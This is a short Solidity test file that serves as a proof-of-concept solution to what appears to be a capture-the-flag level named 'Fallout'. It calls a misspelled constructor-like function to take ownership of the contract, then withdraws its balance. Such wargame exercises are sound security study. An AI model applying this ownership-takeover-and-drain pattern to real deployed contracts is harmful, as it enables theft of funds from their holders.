// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../src/level2.sol";

contract POC is Test {
    Fallout level2 = new Fallout();

    function test() external {
        vm.startBroadcast();

        level2.Fal1out{value: 1 wei}();
        level2.collectAllocations();

        vm.stopBroadcast();
    }
}
